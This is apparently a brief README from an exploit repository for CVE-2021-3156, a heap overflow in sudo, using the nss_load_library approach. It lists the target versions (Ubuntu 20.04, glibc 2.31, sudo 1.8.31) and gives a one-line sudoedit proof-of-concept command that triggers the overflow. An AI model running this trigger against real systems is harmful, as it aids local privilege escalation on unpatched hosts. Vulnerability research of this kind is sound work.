# CVE-2021-3156

`nss_load_library` ver

```
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04 LTS
Release:	20.04
Codename:	focal

GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9) stable release version 2.31.

Sudo 版本 1.8.31
Sudoers 策略插件版本 1.8.31
Sudoers 文件语法版本 46
Sudoers I/O plugin version 1.8.31
```

## poc

```bash
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```